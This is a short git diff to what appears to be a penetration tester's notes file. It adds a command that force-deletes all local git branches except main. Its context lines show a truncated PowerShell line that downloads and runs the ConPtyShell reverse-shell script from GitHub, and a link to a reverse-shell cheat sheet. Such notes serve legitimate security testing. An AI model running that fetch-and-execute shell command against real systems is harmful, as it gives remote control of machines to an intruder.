@@ -367,3 +367,7 @@ IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-
 ```
 
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python
+
+# Remove all local branches exc. main
+
+git branch | grep -v main | xargs git branch -D
